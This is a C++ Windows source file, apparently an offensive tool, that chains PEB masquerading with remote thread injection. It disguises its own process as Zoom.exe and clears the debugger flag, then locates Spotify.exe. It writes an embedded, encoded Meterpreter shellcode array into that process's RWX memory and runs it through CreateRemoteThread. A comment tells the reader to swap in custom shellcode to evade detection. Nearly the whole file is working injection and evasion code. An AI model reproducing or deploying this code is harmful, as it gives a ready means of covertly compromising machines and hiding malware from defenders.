//Chaining PEB Masquerading technique with CreateRemoteThread Injection.

#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <TlHelp32.h>

#pragma comment(lib, "ntdll.lib")

using namespace std;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {


    //Method 1 : Using NtQueryInformation and later enumerating the PBI structure 


    //Gets current running process
    HANDLE hProcess = GetCurrentProcess();

    //Get Current Thread 
    HANDLE hThread = GetCurrentThread();

    //Initialize the PROCESS-BASIC-INFORMATION
    PROCESS_BASIC_INFORMATION pbi;

    //Define the size returned
    ULONG ulSize = 0;

    wchar_t commandline[] = L"C:\\Users\\Asus\\AppData\\Roaming\\Zoom\bin\\Zoom.exe";
    wchar_t imagepathp[] = L"C:\\Users\\Asus\\AppData\\Roaming\\Zoom\bin";
    // Call NtQueryInformationProcess to get the size of the structure
    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &ulSize);

    cout << "The Being debugged  value is : " << pbi.PebBaseAddress->BeingDebugged;

    cout << " Changing the value of BeingDebugged to 0 for fun  :) ";
    pbi.PebBaseAddress->BeingDebugged = 0;

    pbi.PebBaseAddress->ProcessParameters->CommandLine.Buffer = commandline;
    pbi.PebBaseAddress->ProcessParameters->ImagePathName.Buffer = imagepathp;

    //Use your own Shellcode to avoid detection use can use the sRDI technique. 

    unsigned char meterpreter_shellcode[] =

        "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
        "\xff\xff\xff\x48\xbb\x7e\xa9\x86\xb8\x70\x8a\x4e\x58\x48"
        "\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x82\xe1\x05"
        "\x5c\x80\x62\x8e\x58\x7e\xa9\xc7\xe9\x31\xda\x1c\x09\x28"
        "\xe1\xb7\x6a\x15\xc2\xc5\x0a\x1e\xe1\x0d\xea\x68\xc2\xc5"
        "\x0a\x5e\xe1\x0d\xca\x20\xc2\x41\xef\x34\xe3\xcb\x89\xb9"
        "\xc2\x7f\x98\xd2\x95\xe7\xc4\x72\xa6\x6e\x19\xbf\x60\x8b"
        "\xf9\x71\x4b\xac\xb5\x2c\xe8\xd7\xf0\xfb\xd8\x6e\xd3\x3c"
        "\x95\xce\xb9\xa0\x01\xce\xd0\x7e\xa9\x86\xf0\xf5\x4a\x3a"
        "\x3f\x36\xa8\x56\xe8\xfb\xc2\x56\x1c\xf5\xe9\xa6\xf1\x71"
        "\x5a\xad\x0e\x36\x56\x4f\xf9\xfb\xbe\xc6\x10\x7f\x7f\xcb"
        "\x89\xb9\xc2\x7f\x98\xd2\xe8\x47\x71\x7d\xcb\x4f\x99\x46"
        "\x49\xf3\x49\x3c\x89\x02\x7c\x76\xec\xbf\x69\x05\x52\x16"
        "\x1c\xf5\xe9\xa2\xf1\x71\x5a\x28\x19\xf5\xa5\xce\xfc\xfb"
        "\xca\x52\x11\x7f\x79\xc7\x33\x74\x02\x06\x59\xae\xe8\xde"
        "\xf9\x28\xd4\x17\x02\x3f\xf1\xc7\xe1\x31\xd0\x06\xdb\x92"
        "\x89\xc7\xea\x8f\x6a\x16\x19\x27\xf3\xce\x33\x62\x63\x19"
        "\xa7\x81\x56\xdb\xf1\xce\xfd\x3d\x6a\x21\x9a\xb4\xb8\x70"
        "\xcb\x18\x11\xf7\x4f\xce\x39\x9c\x2a\x4f\x58\x7e\xe0\x0f"
        "\x5d\x39\x36\x4c\x58\x7f\x12\x46\x10\x14\x8d\x0f\x0c\x37"
        "\x20\x62\xf4\xf9\x7b\x0f\xe2\x32\xde\xa0\xbf\x8f\x5f\x02"
        "\xd1\x94\xc1\x87\xb9\x70\x8a\x17\x19\xc4\x80\x06\xd3\x70"
        "\x75\x9b\x08\x2e\xe4\xb7\x71\x3d\xbb\x8e\x10\x81\x69\xce"
        "\x31\xb2\xc2\xb1\x98\x36\x20\x47\xf9\xca\x60\x41\x87\x9e"
        "\x56\x53\xf0\xf9\x4d\x24\x48\x3f\xf1\xca\x31\x92\xc2\xc7"
        "\xa1\x3f\x13\x1f\x1d\x04\xeb\xb1\x8d\x36\x28\x42\xf8\x72"
        "\x8a\x4e\x11\xc6\xca\xeb\xdc\x70\x8a\x4e\x58\x7e\xe8\xd6"
        "\xf9\x20\xc2\xc7\xba\x29\xfe\xd1\xf5\x41\x4a\x24\x55\x27"
        "\xe8\xd6\x5a\x8c\xec\x89\x1c\x5a\xfd\x87\xb9\x38\x07\x0a"
        "\x7c\x66\x6f\x86\xd0\x38\x03\xa8\x0e\x2e\xe8\xd6\xf9\x20"
        "\xcb\x1e\x11\x81\x69\xc7\xe8\x39\x75\x86\x15\xf7\x68\xca"
        "\x31\xb1\xcb\xf4\x21\xb2\x96\x00\x47\xa5\xc2\x7f\x8a\x36"
        "\x56\x4c\x33\x7e\xcb\xf4\x50\xf9\xb4\xe6\x47\xa5\x31\xbe"
        "\xed\xdc\xff\xc7\x02\xd6\x1f\xf3\xc5\x81\x7c\xce\x3b\xb4"
        "\xa2\x72\x5e\x02\xa3\x06\x43\x90\xff\x4b\xe3\x39\xba\xf4"
        "\xd7\x1a\x8a\x17\x19\xf7\x73\x79\x6d\x70\x8a\x4e\x58";




    HANDLE _OpenProcess{};
    HANDLE _CreateRemoteThread{};
    PVOID threadrourtineshellcoderun;
    DWORD processID = 4352;
    PROCESSENTRY32 pe{};
    ZeroMemory(&pe, sizeof(pe));
    pe.dwSize = sizeof(PROCESSENTRY32);

    HANDLE _CreateToolHelp32Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
    if (!Process32First(_CreateToolHelp32Snapshot, &pe)) {
        std::cerr << "Failed to get first process.\n";
        CloseHandle(_CreateToolHelp32Snapshot);
        return 1;
    }
    do {
        if (wcscmp(pe.szExeFile, L"Spotify.exe") == 0) {
            processID = pe.th32ProcessID;
            break;
        }
    } while (Process32Next(_CreateToolHelp32Snapshot, &pe));
    CloseHandle(_CreateToolHelp32Snapshot);
    if (processID == 0) {
        std::cout << "Spotify is not found.\n";
    }
    else {
        std::cout << "Spotify is runnin & found. Process ID: " << processID << "\n";
    }

    
    _OpenProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processID);
    threadrourtineshellcoderun = VirtualAllocEx(_OpenProcess, NULL, sizeof(meterpreter_shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    BOOL _WriteProcessMemory = WriteProcessMemory(_OpenProcess, threadrourtineshellcoderun, meterpreter_shellcode, sizeof(meterpreter_shellcode), NULL);
    _CreateRemoteThread = CreateRemoteThread(_OpenProcess, NULL, 0, (LPTHREAD_START_ROUTINE)threadrourtineshellcoderun, NULL, 0, NULL);
    CloseHandle(_OpenProcess);



    return 0;

}

